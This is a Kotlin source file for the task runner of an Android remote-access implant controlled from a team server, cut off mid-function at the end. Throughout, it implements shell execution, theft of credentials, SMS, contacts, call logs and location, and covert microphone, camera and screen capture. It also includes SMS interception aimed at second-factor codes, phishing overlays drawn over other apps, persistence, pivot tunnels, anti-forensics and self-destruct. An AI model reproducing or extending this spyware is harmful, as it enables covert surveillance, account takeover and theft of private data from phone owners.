package io.umbra.beacon

import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.io.RandomAccessFile
import java.security.MessageDigest
import java.util.concurrent.TimeUnit

/** Executes tasks handed out by the team server. */
object TaskRunner {
    const val MAX_OUTPUT = 900 * 1024

    /**
     * The task kinds this implant can run.
     *
     * The list travels in the handshake metadata: the server refuses to queue
     * work an agent cannot do, so the operator learns what the phone is
     * capable of before the task is sent instead of after it failed.
     *
     * Only the kinds the phone really runs are listed. A desktop-only arm
     * that answers "unsupported" is not a capability.
     */
    val CAPABILITIES: List<String> = listOf(
        "shell", "exec", "sysinfo", "recon", "ls", "download", "cat", "upload",
        "tail", "hash", "ps", "sleep", "exit", "kill", "ping", "tunnel",
        "triage", "find", "netinfo", "env", "resolve", "touch", "pwd",
        "persist", "unpersist", "persist.list", "persist.verify",
        "persist.migrate", "persist.health",
        "evade.report", "evade.posture", "evade.profile", "evade.killswitch",
        "hygiene.memory", "creds", "privesc", "host.guide",
        "ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global",
        "ui.events",
        // the senses of the phone
        "gps.locate", "wifi.dump", "bluetooth.scan", "contacts.dump",
        "sms.dump", "call.logs", "emulator.detect",
        // the watchers: the things that happen without the operator asking
        "sms.watch", "clipboard.sniff",
        // the ears and the eyes
        "media.mic", "media.camera", "live.screen", "ui.stream",
        // the false screen, the databases and the end of it
        "phish.overlay", "app.dump", "anti.forensic", "evade.suicide",
        // the senses of the desktop, on the phone
        "window.list", "clipboard.watch", "screen.stream", "wifi.profiles",
        "browser.creds", "av.survey", "usb.history", "proc.memory",
    )

    /**
     * The connection parameters a task may need.
     *
     * Most tasks do not need them, but the pivot callback cannot work
     * without the address of the team server and the agent key, so the
     * beacon hands them over once at start-up.
     */
    data class Context(
        val host: String,
        val port: Int,
        val psk: ByteArray,
        val agentId: String,
        val version: String,
        val log: (String) -> Unit,
        /**
         * Where the implant keeps its own state.
         *
         * The persistence manager writes the entries it installed here, so
         * the operator can ask the phone what is on it weeks later.
         */
        val stateDir: String = "",
        /**
         * The Android context, when the implant runs on a phone.
         *
         * It is optional on purpose: the task runner is plain JVM code, and
         * the tests (and the desktop build of the tools) run without it.
         */
        val android: android.content.Context? = null,
    ) {
        override fun equals(other: Any?): Boolean = this === other
        override fun hashCode(): Int = System.identityHashCode(this)
    }

    @Volatile
    private var context: Context? = null

    /** Hand the connection parameters to the task runner. */
    fun configure(ctx: Context) {
        context = ctx
    }

    class Outcome(val code: Long, val out: ByteArray, val err: String) {
        /**
         * Extra RESULT fields (`total`, `offset`, `eof`, `sha256`, ...). The
         * server stores the scalars as task metadata, which is what makes a
         * chunked transfer verifiable.
         */
        val extra: MutableList<Pair<String, Upk>> = mutableListOf()

        /**
         * The chunks of a streamed answer.
         *
         * A picture of the screen is bigger than a frame of the protocol
         * allows, and a stream of them is bigger still.  The beacon sends
         * every chunk as a partial result -- the task stays open while the
         * chunks travel -- and the final result closes it.
         */
        val chunks: MutableList<ByteArray> = mutableListOf()

        fun with(key: String, value: Upk): Outcome {
            extra.add(key to value)
            return this
        }

        fun toValue(taskId: String): Upk.MapV {
            val fields = mutableListOf<Pair<String, Upk>>(
                "id" to Upk.str(taskId),
                "code" to Upk.num(code),
                "out" to Upk.bin(out),
                "err" to Upk.str(err),
            )
            fields.addAll(extra)
            return Upk.map(*fields.toTypedArray())
        }

        /**
         * One chunk of a streamed answer.
         *
         * The chunk carries the flag that says the task is still running,
         * so the server keeps the task open while the pieces travel.
         */
        fun partialValue(taskId: String, chunk: ByteArray): Upk.MapV {
            return Upk.map(
                "id" to Upk.str(taskId),
                "code" to Upk.num(code),
                "out" to Upk.bin(chunk),
                "err" to Upk.str(err),
                "partial" to Upk.bool(true),
            )
        }
    }

    /**
     * The identity material of the phone.
     *
     * The shape is the shape of the desktop implant: a list of records with
     * a kind, a source, an account and a confidence.  The value of a
     * material is only sent when the operator asked for it.
     */
    fun credentials(args: Upk): Outcome {
        val raw = args.field("raw")?.flag() ?: false
        val mode = args.field("mode")?.text() ?: "local"
        val entries = mutableListOf<Credentials.Entry>()
        if (mode == "all" || mode == "local" || mode == "vault" || mode.isEmpty()) {
            entries.addAll(Credentials.accounts(context?.android))
            entries.addAll(Credentials.stateFiles(stateDir()))
        }
        if (mode == "all" || mode == "device") {
            entries.addAll(Credentials.privilegeState())
        }
        val counts = mutableMapOf<String, Long>()
        for (entry in entries) {
            counts[entry.kind] = (counts[entry.kind] ?: 0L) + 1L
        }
        val countFields = counts.map { (kind, count) -> kind to Upk.num(count) }.toTypedArray()
        return Outcome(0, Credentials.report(entries).toByteArray(), "")
            .with("creds", Credentials.values(entries, raw))
            .with("creds_total", Upk.num(entries.size.toLong()))
            .with("creds_counts", Upk.map(*countFields))
    }

    /**
     * The privilege state of the phone.
     *
     * The phone is not a Windows machine, so there is no token to steal:
     * what the operator gets is the truth about the device.
     */
    fun privilegeState(): Outcome {
        val entries = Credentials.privilegeState()
        val attempts = entries.map { entry ->
            Upk.map(
                "technique" to Upk.str("device.${entry.source}"),
                "outcome" to Upk.str(if (entry.confidence >= 50) "worked" else "unavailable"),
                "detail" to Upk.str(entry.note),
                "side_effects" to Upk.Arr(emptyList()),
            )
        }
        return Outcome(0, Credentials.report(entries).toByteArray(), "")
            .with("escalations", Upk.Arr(attempts))
            .with("escalations_total", Upk.num(attempts.size.toLong()))
    }

    fun shell(command: String, timeoutSec: Long): Outcome {
        if (command.isBlank()) return Outcome(1, ByteArray(0), "empty command")
        val limit = timeoutSec.coerceAtLeast(1)
        return try {
            // stderr is merged into stdout so one thread drains both.
            val proc = ProcessBuilder("sh", "-c", command)
                .redirectErrorStream(true)
                .start()
            // The child never reads stdin; closing it makes `cat`-style
            // commands see EOF instead of hanging until the timeout.
            runCatching { proc.outputStream.close() }

            // Drain concurrently. Reading only after waitFor would deadlock on
            // any command that writes more than the pipe buffer (~64 KiB):
            // the child blocks in write() and never exits. The buffer is
            // capped, but reading continues so the child can always finish.
            val sink = ByteArrayOutputStream()
            val reader = Thread {
                val chunk = ByteArray(8192)
                try {
                    proc.inputStream.use { input ->
                        while (true) {
                            val n = input.read(chunk)
                            if (n < 0) break
                            synchronized(sink) {
                                val room = MAX_OUTPUT + 4096 - sink.size()
                                if (room > 0) sink.write(chunk, 0, minOf(n, room))
                            }
                        }
                    }
                } catch (_: IOException) {
                    // Stream closed by destroyForcibly() or a broken pipe.
                }
            }
            reader.isDaemon = true
            reader.start()

            val finished = proc.waitFor(limit, TimeUnit.SECONDS)
            if (!finished) {
                proc.destroyForcibly()
                reader.join(1000)
                return Outcome(124, drained(sink), "timeout after ${limit}s")
            }
            reader.join(2000)
            if (reader.isAlive) {
                return Outcome(proc.exitValue().toLong(), drained(sink), "output reader stalled")
            }
            Outcome(proc.exitValue().toLong(), drained(sink), "")
        } catch (t: Throwable) {
            Outcome(127, ByteArray(0), "exec failed: ${t.message}")
        }
    }

    /** Snapshot the drained output, truncating with a marker past MAX_OUTPUT. */
    private fun drained(sink: ByteArrayOutputStream): ByteArray {
        val all = synchronized(sink) { sink.toByteArray() }
        if (all.size <= MAX_OUTPUT) return all
        return all.copyOfRange(0, MAX_OUTPUT) + "\n[umbra: output truncated]\n".toByteArray()
    }

    /**
     * Triage one file: the size, the digest and the format.
     *
     * The phone has no shell the operator can use, so the implant answers
     * the question itself.
     */
    private fun triage(path: String): Outcome {
        if (path.isEmpty()) return Outcome(2, ByteArray(0), "triage needs a path")
        return try {
            val file = java.io.File(path)
            if (!file.exists()) return Outcome(1, ByteArray(0), "triage: no such file")
            val bytes = file.readBytes()
            val digest = java.security.MessageDigest.getInstance("SHA-256").digest(bytes)
            val magic = when {
                bytes.size >= 2 && bytes[0] == 'M'.code.toByte() && bytes[1] == 'Z'.code.toByte() -> "PE"
                bytes.size >= 4 && bytes[0] == 0x7f.toByte() -> "ELF"
                bytes.size >= 4 && bytes[0] == 'P'.code.toByte() && bytes[1] == 'K'.code.toByte() -> "ZIP"
                else -> "unknown"
            }
            val report = "path: $path\nsize: ${bytes.size}\n" +
                "sha256: ${digest.joinToString("") { "%02x".format(it) }}\n" +
                "magic: $magic\n"
            Outcome(0, report.toByteArray(), "")
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "triage failed: ${t.message}")
        }
    }

    /** Search for files by name or by content. */
    private fun find(root: String, name: String, content: String): Outcome {
        val start = java.io.File(root)
        if (!start.exists()) return Outcome(1, ByteArray(0), "find: no such path")
        val needle = name.lowercase()
        val hits = StringBuilder()
        var count = 0
        val stack = ArrayDeque<java.io.File>()
        stack.add(start)
        while (stack.isNotEmpty() && count < 200) {
            val dir = stack.removeLast()
            val children = dir.listFiles() ?: continue
            for (child in children) {
                if (child.isDirectory) {
                    stack.add(child)
                    continue
                }
                val matched = needle.isEmpty() || child.name.lowercase().contains(needle)
                if (matched) {
                    hits.append(child.path).append("\n")
                    count++
                    if (count >= 200) break
                }
            }
        }
        val report = "scanned files, $count hits\n$hits"
        return Outcome(0, report.toByteArray(), "")
    }

    /** The network interfaces of the phone. */
    private fun netInfo(): String {
        val out = StringBuilder("source: android\ninterfaces:\n")
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces != null && interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                val addresses = iface.inetAddresses
                while (addresses.hasMoreElements()) {
                    out.append("  ${iface.name} ${addresses.nextElement().hostAddress}\n")
                }
            }
        } catch (t: Throwable) {
            out.append("  (unavailable: ${t.message})\n")
        }
        return out.toString()
    }

    fun run(kind: String, args: Upk): Outcome {
        val path = args.field("path")?.text() ?: ""
        return when (kind) {
            "shell", "exec" -> shell(
                args.field("cmd")?.text() ?: "",
                args.field("timeout")?.long() ?: 60,
            )
            "sysinfo", "recon" -> Outcome(0, SysInfo.report().toByteArray(), "")
            "ls" -> listDir(if (path.isEmpty()) "/" else path)
            "download", "cat" -> download(
                path,
                args.field("offset")?.long() ?: 0,
                args.field("limit")?.long() ?: MAX_OUTPUT.toLong(),
            )
            "upload" -> upload(
                path,
                args.field("data")?.bytes() ?: ByteArray(0),
                args.field("offset")?.long() ?: 0,
                args.field("eof")?.flag() ?: true,
            )
            "tail" -> tail(path, args.field("lines")?.long() ?: 20L)
            "hash" -> hash(path)
            "ps" -> processList()
            "proc.kill" -> unsupported("proc.kill", "the implant does not kill processes by itself")
            "sleep" -> Outcome(0, "sleep interval updated\n".toByteArray(), "")
            "exit", "kill" -> Outcome(0, "beacon exiting\n".toByteArray(), "")
            "ping" -> Outcome(0, "pong\n".toByteArray(), "")

            // ---- pivoting ------------------------------------------------
            "tunnel" -> tunnel(args)

            // ---- platform specific ---------------------------------------
            "triage" -> triage(path)
            "find" -> find(
                args.field("path")?.text() ?: ".",
                args.field("name")?.text() ?: "",
                args.field("content")?.text() ?: "",
            )
            "netinfo" -> Outcome(0, netInfo().toByteArray(), "")

            // ---- persistence ------------------------------------------------
            "persist" -> persistence(
                Persistence.install(
                    context?.android,
                    stateDir(),
                    args,
                ),
            )

            "unpersist" -> persistence(
                Persistence.remove(
                    context?.android,
                    stateDir(),
                    args,
                ),
            )

            "persist.list" -> persistence(Persistence.list(stateDir()))
            "persist.verify" -> persistence(Persistence.verify(context?.android, stateDir()))
            "persist.migrate" -> persistence(
                Persistence.migrate(context?.android, stateDir(), args),
            )

            "persist.health" -> persistence(
                Persistence.health(context?.android, stateDir()),
            )

            // ---- the posture and the kill switch ---------------------------
            "evade.report" -> evasionReport()
            "evade.posture" -> evasionPosture(args)
            "evade.profile" -> evasionProfile(args)
            "evade.killswitch" -> evasionKillswitch(args)
            "hygiene.memory" -> Outcome(0, Evasion.memoryReport().toByteArray(), "")

            // ---- the rules of the manufacturer ---------------------------
            "host.guide" -> hostGuide(args)

            // ---- the window of the phone ----------------------------------
            // The accessibility service is what gives the operator the
            // screen and a hand on the phone.  The service has to be
            // enabled by the operator, and the answer says so when it is
            // not.
            "ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global", "ui.events" -> ui(kind, args)

            // ---- the senses of the phone ---------------------------------
            // Every collector answers with the truth of the phone: a
            // permission that was not granted is reported, never faked.
            "gps.locate" -> sense("gps.locate", args)
            "wifi.dump" -> sense("wifi.dump", args)
            "bluetooth.scan" -> sense("bluetooth.scan", args)
            "contacts.dump" -> sense("contacts.dump", args)
            "sms.dump" -> sense("sms.dump", args)
            "call.logs" -> sense("call.logs", args)
            "emulator.detect" -> lab(args)

            // ---- the senses of the desktop, on the phone -----------------
            // The phone is not a desktop.  What the platform allows is
            // answered, and what it hides is refused with the reason, so
            // the operator knows the difference between "nothing there"
            // and "the platform will not say".
            "window.list" -> desktopWindows()
            "clipboard.watch" -> watch("clipboard", args, "clipboard.watch")
            "screen.stream" -> projection("screen.stream", args)
            "wifi.profiles" -> desktopOf("wifi.profiles") { Desktop.wifiProfiles(it) }
            "browser.creds" -> desktopOf("browser.creds") { Desktop.browserCreds(it) }
            "av.survey" -> desktopOf("av.survey") { Desktop.avSurvey(it) }
            "usb.history" -> desktopUsb(args)
            "proc.memory" -> desktopMemory(args)

            // ---- the watchers ---------------------------------------------
            // The queue of the watchers is durable and the phone connects
            // again as soon as something arrives.
            "sms.watch" -> watch("sms", args)
            "clipboard.sniff" -> watch("clipboard", args)

            // ---- the ears and the eyes -------------------------------------
            "media.mic" -> media("media.mic", args)
            "media.camera" -> media("media.camera", args)
            "live.screen" -> projection("live.screen", args)
            "ui.stream" -> projection("ui.stream", args)

            // ---- the false screen, the databases, the end -----------------
            "phish.overlay" -> overlay(args)
            "app.dump" -> appDump(args)
            "anti.forensic" -> forensics("anti.forensic", args)
            "evade.suicide" -> forensics("evade.suicide", args)

            // ---- network reach and the local environment ------------------
            "env" -> environment(args.field("filter")?.text() ?: "")
            // The working directory of the implant.  On a phone the
            // process starts in the root of the filesystem, and the
            // answer says so instead of pretending to be somewhere else.
            "pwd" -> Outcome(0, "${System.getProperty("user.dir") ?: "/"}\n".toByteArray(), "")
            "resolve" -> resolve(
                args.field("host")?.text() ?: "",
                args.field("port")?.long() ?: 0L,
            )
            "touch" -> touch(path)
            "evade.shape" -> unsupported("evade.shape", "the traffic shaping needs the desktop implant")
            "hygiene.process" -> unsupported("hygiene.process", "the process hygiene needs the desktop implant")
            "scan" -> unsupported("scan", "network scanning needs the desktop implant")
            "recon.suggest" -> unsupported("recon.suggest", "the suggestions need the desktop implant")
            "domain.map" -> unsupported("domain.map", "the domain map needs the desktop implant")
            "wmi.exec" -> unsupported("wmi.exec", "the remote execution needs the desktop implant")
            "smb.exec" -> unsupported("smb.exec", "the remote execution needs the desktop implant")
            "winrm.exec" -> unsupported("winrm.exec", "the remote execution needs the desktop implant")
            "dcom.exec" -> unsupported("dcom.exec", "the remote execution needs the desktop implant")
            "ldap.query" -> unsupported("ldap.query", "the remote execution needs the desktop implant")
            "ssh.exec" -> unsupported("ssh.exec", "the remote execution needs the desktop implant")
            "p2p" -> unsupported("p2p", "peer links need the desktop implant")
            "bof" -> unsupported("bof", "COFF modules are a Windows capability")
            "ext" -> unsupported("ext", "extensions are a Windows capability")
            "wasm" -> unsupported("wasm", "webassembly modules are a Windows capability")
            "script" -> unsupported("script", "script modules are a Windows capability")
            "shellcode" -> unsupported("shellcode", "raw shellcode is a Windows capability")
            "inject" -> unsupported("inject", "injection is a Windows capability")
            "creds" -> credentials(args)
            "token" -> unsupported("token", "token impersonation is a Windows capability")
            "privesc" -> privilegeState()
            "vpn" -> unsupported("vpn", "the layer-3 tunnel needs a tun device")
            "update" -> unsupported("update", "the implant is updated by the service")
            "session.open" -> unsupported("session.open", "an interactive session needs the desktop implant")
            "session.input" -> unsupported("session.input", "an interactive session needs the desktop implant")
            "session.close" -> unsupported("session.close", "an interactive session needs the desktop implant")
            "keylog" -> unsupported("keylog", "android has no global keyboard hook")
            "keylog.file" -> unsupported("keylog.file", "android has no global keyboard hook")
            "registry" -> unsupported("registry", "android has no windows registry")
            "screenshot" -> unsupported("screenshot", "the screen capture needs a desktop implant")
            "clipboard" -> unsupported("clipboard", "the clipboard needs a desktop implant")

            else -> Outcome(2, ByteArray(0), "unknown task kind \"$kind\"")
        }
    }

    /**
     * Open a pivot callback session.
     *
     * The session runs on its own thread: the beacon has to keep beaconing
     * while the pivot is open, so the task only reports that it started.
     */
    private fun tunnel(args: Upk): Outcome {
        val ctx = context
        if (ctx == null) return Outcome(1, ByteArray(0), "tunnel: the implant has no server address")
        val streamId = args.field("stream")?.text() ?: ""
        if (streamId.isEmpty()) return Outcome(1, ByteArray(0), "tunnel requires args.stream")
        val t = Thread({
            try {
                Tunnel.openCallback(
                    ctx.host, ctx.port, ctx.psk, ctx.agentId, streamId, ctx.version, ctx.log,
                )
            } catch (e: Throwable) {
                ctx.log("tunnel callback failed: ${e.message}")
            }
        }, "umbra-tunnel-callback")
        t.isDaemon = true
        t.start()
        return Outcome(0, "tunnel session $streamId opened\n".toByteArray(), "")
            .with("stream", Upk.str(streamId))
    }

    /** Report a capability this platform does not have. */
    /**
     * The result of a persistence task.
     *
     * The entries travel with the result, so the server keeps what is
     * installed on every host and can tell the operator when an entry was
     * removed behind their back.
     */
    private fun persistence(report: Persistence.Report): Outcome {
        val entries = report.entries.map { entry ->
            Upk.map(
                "technique" to Upk.str(entry.technique),
                "name" to Upk.str(entry.name),
                "trigger" to Upk.str(entry.trigger),
                "location" to Upk.str(entry.location),
                "detail" to Upk.str(entry.detail),
                "state" to Upk.str(entry.state),
                "installed_at" to Upk.str(entry.installedAt),
            )
        }
        return Outcome(0, report.text.toByteArray(), "")
            .with("persist", Upk.Arr(entries))
            .with("persist_total", Upk.num(report.total))
            .with("persist_broken", Upk.num(report.broken))
    }

    /** Where the implant keeps its own state. */
    private fun stateDir(): String = context?.stateDir ?: ""

    /**
     * Take the persistence entries away.
     *
     * The exit of the implant is the last word of the operator: the phone
     * is left the way it was found, so the boot receiver, the foreground
     * service and the alarm go with it.  This is the path the panic task
     * of the server takes.
     */
    fun removePersistence() {
        val ctx = context ?: return
        val args = Upk.map("method" to Upk.str("all"))
        Persistence.remove(ctx.android, ctx.stateDir, args)
    }

    /**
     * The guide of the host: what keeps the implant alive here.
     *
     * On a phone the answer is the rules of the manufacturer: the
     * autostart list of Xiaomi, the battery optimisation, the
     * notification and the standby bucket.  The operator may ask for the
     * screen of a step, and the phone shows it -- the permission itself
     * has to be pressed by the user of the phone.
     */
    private fun hostGuide(args: Upk): Outcome {
        val ctx = context?.android
        if (ctx == null) {
            return Outcome(0, "guide: the phone has no context to look at\n".toByteArray(), "")
        }
        val action = args.field("action")?.text() ?: "report"
        if (action == "show") {
            val step = args.field("step")?.text() ?: ""
            val text = Vendor.show(ctx, step)
            return Outcome(0, text.toByteArray(), "").with("guide", guideValue(ctx))
        }
        return Outcome(0, Vendor.report(ctx).toByteArray(), "")
            .with("guide", guideValue(ctx))
    }

    /** The guide as a value, so the operator can read it without the text. */
    private fun guideValue(ctx: android.content.Context): Upk {
        val fields = mutableListOf<Pair<String, Upk>>()
        for ((key, value) in Vendor.state(ctx)) {
            fields.add(key to Upk.str(value))
        }
        val steps = Vendor.steps(ctx).map { step ->
            Upk.map(
                "id" to Upk.str(step.id),
                "title" to Upk.str(step.title),
                "why" to Upk.str(step.why),
                "state" to Upk.str(step.state),
            )
        }
        fields.add("steps" to Upk.Arr(steps))
        return Upk.map(*fields.toTypedArray())
    }

    /** The posture of the phone. */
    /**
     * The window of the phone, seen through the accessibility service.
     *
     * The service is the only way an application on a phone can see what
     * the user is looking at, so the answer says clearly when it is not
     * enabled: a phone that answers "nothing happened" would be a phone
     * that lies.
     */
    private fun ui(kind: String, args: Upk): Outcome {
        if (!Ui.isEnabled()) {
            return Outcome(
                2,
                ByteArray(0),
                "the accessibility service is not enabled: the operator has to " +
                "turn on ${Ui.component()} in the settings of the phone",
            )
        }
        val request = Ui.Request(
            kind.removePrefix("ui."),
            mapOf(
                "needle" to (args.field("needle")?.text() ?: ""),
                "value" to (args.field("value")?.text() ?: ""),
                "direction" to (args.field("direction")?.text() ?: "forward"),
                "action" to (args.field("action")?.text() ?: "back"),
                "index" to (args.field("index")?.long()?.toString() ?: "0"),
            ),
        )
        return try {
            val answer = Ui.submit(request)
            Outcome(0, answer.toByteArray(), "")
        } catch (t: Throwable) {
            Outcome(2, ByteArray(0), t.message ?: t.toString())
        }
    }

    /**
     * The senses of the phone.
     *
     * The collector answers with the truth of the phone, including the
     * permissions the user did not grant: an empty answer would be a
     * phone that lies.
     */
    private fun sense(kind: String, args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to look at")
        val limit = args.field("limit")?.long()?.toInt()?.coerceIn(1, 1000) ?: 200
        val report = when (kind) {
            "gps.locate" -> Sense.location(ctx)
            "wifi.dump" -> Sense.wifi(ctx)
            "bluetooth.scan" -> Sense.bluetooth(ctx)
            "contacts.dump" -> Sense.contacts(ctx, limit)
            "sms.dump" -> Sense.sms(ctx, limit)
            "call.logs" -> Sense.calls(ctx, limit)
            else -> return Outcome(2, ByteArray(0), "unknown collector $kind")
        }
        return Outcome(0, report.text().toByteArray(), "")
            .with("report", report.value())
            .with("rows", Upk.num(report.count().toLong()))
    }

    /**
     * A report of the desktop families.
     *
     * The task runner is plain JVM code and the tests run without a
     * phone, so the context is optional everywhere: a family that needs
     * a phone that is not there answers with an error, not with a crash.
     */
    private fun desktopOf(kind: String, report: (android.content.Context) -> Sense.Report): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to look at")
        return desktopReport(report(ctx))
    }

    /**
     * The window table of the phone.
     *
     * The phone has no window table; the accessibility service sees the
     * windows that came to the front, and that log is what the operator
     * gets.
     */
    private fun desktopWindows(): Outcome {
        val report = Desktop.windows()
        return Outcome(0, report.text().toByteArray(), "")
            .with("report", report.value())
            .with("rows", Upk.num(report.count().toLong()))
    }

    /**
     * A report of the desktop families.
     *
     * The report is the shape the operator knows: the rows and the notes.
     */
    private fun desktopReport(report: Sense.Report): Outcome {
        return Outcome(0, report.text().toByteArray(), "")
            .with("report", report.value())
            .with("rows", Upk.num(report.count().toLong()))
    }

    /**
     * The USB devices of the phone.
     *
     * The watcher of the keys is started and stopped like the other
     * watchers, and the answer tells the operator which devices are
     * attached and which ones the implant has seen.
     */
    private fun desktopUsb(args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "usb.history: the phone has no context to read")
        val action = args.field("action")?.text() ?: "status"
        when (action) {
            "start" -> return Outcome(0, UsbWatch.start(ctx).toByteArray(), "")
            "stop" -> return Outcome(0, UsbWatch.stop(ctx).toByteArray(), "")
        }
        val report = Desktop.usb(ctx, ctx.filesDir.absolutePath)
        return Outcome(0, report.text().toByteArray(), "")
            .with("report", report.value())
            .with("rows", Upk.num(report.count().toLong()))
            .with("watch", Upk.bool(UsbWatch.running()))
    }

    /**
     * The memory of a process of the phone.
     *
     * The memory of another application belongs to that application, so
     * the answer needs root and says so when it is not there.
     */
    private fun desktopMemory(args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "proc.memory: the phone has no context to read")
        val pid = args.field("pid")?.text() ?: ""
        val report = Desktop.memory(ctx, pid)
        return Outcome(0, report.text().toByteArray(), "")
            .with("report", report.value())
            .with("rows", Upk.num(report.count().toLong()))
    }

    /**
     * The watchers of the phone.
     *
     * The queue is durable and the phone connects again as soon as
     * something arrives, so the operator does not wait for the next
     * check-in to read the code of the second factor.
     */
    private fun watch(kind: String, args: Upk, label: String = kind): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to watch")
        val action = args.field("action")?.text() ?: "status"
        val stateDir = ctx.filesDir.absolutePath
        return when (action) {
            "start" -> {
                val text = if (kind == "sms") SmsWatch.start(ctx) else ClipboardWatch.start(ctx)
                Outcome(0, text.toByteArray(), "").with("watch", Upk.str(kind))
            }
            "stop" -> {
                val text = if (kind == "sms") SmsWatch.stop(ctx) else ClipboardWatch.stop(ctx)
                Outcome(0, text.toByteArray(), "").with("watch", Upk.str(kind))
            }
            "poll" -> {
                val items = Watch.drain(stateDir, kind)
                val text = if (items.isEmpty()) {
                    "the queue of the $kind watcher is empty\n"
                } else {
                    items.joinToString("\n") { it.text() } + "\n"
                }
                Outcome(0, text.toByteArray(), "")
                    .with("watch", Upk.Arr(items.map { it.value() }))
                    .with("watch_total", Upk.num(items.size.toLong()))
            }
            else -> {
                val text = if (kind == "sms") SmsWatch.status(ctx) else ClipboardWatch.status(ctx, label)
                Outcome(0, text.toByteArray(), "")
            }
        }
    }

    /**
     * The ears and the eyes of the phone.
     *
     * The capture is a file on the phone, and the operator pulls it with
     * the ordinary `download` task: the digest makes the transfer
     * verifiable instead of hopeful.
     */
    private fun media(kind: String, args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to record")
        val directory = context?.stateDir?.takeIf { it.isNotEmpty() } ?: ctx.filesDir.absolutePath
        val capture = if (kind == "media.mic") {
            val seconds = args.field("seconds")?.long()?.toInt()?.coerceIn(1, 900) ?: 30
            Media.record(ctx, seconds, directory)
        } else {
            val facing = args.field("facing")?.text() ?: "back"
            Media.photograph(ctx, facing, directory)
        }
        val failed = capture.path.isEmpty() && capture.inline == null
        return Outcome(
            if (failed) 2L else 0L,
            capture.text().toByteArray(),
            if (failed) capture.note else "",
        ).with("capture", capture.value())
    }

    /**
     * The screen of the phone, as a picture and as a stream.
     *
     * The capture of the screen is the one capability the platform never
     * gives away: the user of the phone has to press the button of the
     * system dialog, and the answer says so.
     */
    private fun projection(kind: String, args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to project")
        val directory = context?.stateDir?.takeIf { it.isNotEmpty() } ?: ctx.filesDir.absolutePath
        val action = args.field("action")?.text() ?: "status"
        return when (action) {
            "request" -> {
                try {
                    val intent = android.content.Intent(ctx, ProjectionActivity::class.java)
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(intent)
                    Outcome(
                        0,
                        "$kind: the phone asks the user for the capture of the screen\n".toByteArray(),
                        "",
                    )
                } catch (t: Throwable) {
                    Outcome(2, ByteArray(0), "$kind: the screen could not be asked for: ${t.message}")
                }
            }
            "capture" -> {
                val frame = Projection.await(10_000)
                if (frame == null) {
                    return Outcome(
                        2,
                        ByteArray(0),
                        "$kind: no picture arrived: the user has to allow the capture first",
                    )
                }
                val file = java.io.File(directory, "screen-${System.currentTimeMillis()}.jpg")
                try {
                    file.writeBytes(frame)
                    val digest = Media.digest(frame)
                    Outcome(
                        0,
                        ("$kind: the picture is at ${file.absolutePath} " +
                            "(${file.length()} bytes, sha256 $digest)\n").toByteArray(),
                        "",
                    ).with(
                        "capture",
                        Upk.map(
                            "path" to Upk.str(file.absolutePath),
                            "size" to Upk.num(file.length()),
                            "sha256" to Upk.str(digest),
                        ),
                    )
                } catch (t: Throwable) {
                    Outcome(2, ByteArray(0), "$kind: the picture could not be written: ${t.message}")
                }
            }
            "start" -> {
                val consent = Projection.consent
                    ?: return Outcome(
                        2,
                        ByteArray(0),
                        "$kind: the capture was never allowed: the user has to press the button of the system",
                    )
                val fps = args.field("fps")?.long()?.toInt()?.coerceIn(1, 10) ?: 2
                ProjectionService.start(ctx, consent, fps)
                Outcome(
                    0,
                    "$kind: the capture of the screen runs at $fps pictures a second\n".toByteArray(),
                    "",
                )
            }
            "stop" -> {
                ProjectionService.stop(ctx)
                Outcome(0, "$kind: the capture of the screen was stopped\n".toByteArray(), "")
            }
            "frames" -> {
                // The desktop names the number of the pictures "frames",
                // and the phone calls it "count": both are read here, so
                // the operator may use the name of the desktop.
                val count = (args.field("count") ?: args.field("frames"))?.long()?.toInt()?.coerceIn(1, 60) ?: 5
                val frames = Projection.drain(count)
                val outcome = Outcome(0, "$kind: ${frames.size} pictures\n".toByteArray(), "")
                    .with("frames", Upk.num(frames.size.toLong()))
                outcome.chunks.addAll(frames)
                outcome
            }
            else -> Outcome(0, "$kind: ${Projection.state}\n".toByteArray(), "")
        }
    }

    /**
     * The false screen of the phone.
     *
     * The overlay waits for the application the operator named and draws
     * the form over it; the answer of the user travels to the queue of
     * the watchers.
     */
    private fun overlay(args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "phish.overlay: the phone has no context to draw on")
        val action = args.field("action")?.text() ?: "status"
        return when (action) {
            "arm" -> Outcome(0, Overlay.arm(ctx, args).toByteArray(), "")
            "dismiss" -> Outcome(0, Overlay.dismiss(ctx).toByteArray(), "")
            else -> Outcome(0, Overlay.status().toByteArray(), "")
        }
    }

    /**
     * The databases of the applications of the phone.
     */
    private fun appDump(args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "app.dump: the phone has no context to read")
        val directory = context?.stateDir?.takeIf { it.isNotEmpty() } ?: ctx.filesDir.absolutePath
        val report = AppDump.dump(
            ctx,
            args.field("package")?.text() ?: "",
            args.field("path")?.text() ?: "databases",
            directory,
        )
        return Outcome(0, report.text().toByteArray(), "")
            .with("report", report.value())
            .with("rows", Upk.num(report.count().toLong()))
    }

    /**
     * The traces of the implant, and the end of it.
     *
     * `anti.forensic` removes the material of the engagement and keeps
     * the implant alive; `evade.suicide` ends everything.
     */
    private fun forensics(kind: String, args: Upk): Outcome {
        val ctx = context?.android
            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to clean")
        val stateDir = context?.stateDir?.takeIf { it.isNotEmpty() } ?: ctx.filesDir.absolutePath
        val text = if (kind == "anti.forensic") {
